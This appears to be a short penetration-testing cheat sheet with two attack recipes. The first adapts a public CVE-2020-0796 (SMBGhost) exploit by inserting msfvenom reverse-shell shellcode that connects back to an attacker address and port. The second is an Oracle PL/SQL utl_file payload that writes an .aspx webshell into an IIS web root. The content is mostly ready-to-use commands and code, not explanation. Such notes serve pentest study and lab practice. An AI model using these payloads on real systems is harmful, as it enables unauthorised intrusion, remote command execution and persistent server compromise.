Tip <p>If last patches were on 2020 and port 445 is open, the target is potentially vulnerable.</p> <pre><code>https://github.com/danigargu/CVE-2020-0796/

# Starting with line 204 in exploit.cpp, we'll replace the shellcode with a reverse shell.
// Generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
uint8_t shellcode[] = {
    0xfc,0x48,0x83,0xe4,...
        0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};

# Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to x64 and Release and compile the exploit.
cve-2020-0796-local.exe
</code></pre>

Tip <pre><code># First we check our privs connected as sysdba:
sqlplus $user/$pass@$IP/$SID as sysdba
SQL &gt; select * from session privs;

# If we have enough privs, we can use this payload to upload files such a .aspx webshell (use locate it on Kali) to an ISS server for example.
declare
    f utl_file.file_type;
    s varchar(5000) := '$SHELLCODE HERE';
begin
    f := utl_file.fopen('/inetpub/wwwroot', 'webshell.aspx', 'W');
    utl_file.put_line(f,s);
    utl_file.fclose(f);
end;
/

# NOTE: the shellcode should be smaller than 1000 characters.

# We can switch from writing a file to reading a file by changing 'W'
# / is the last part which executes the SQL sentences.
</code></pre>
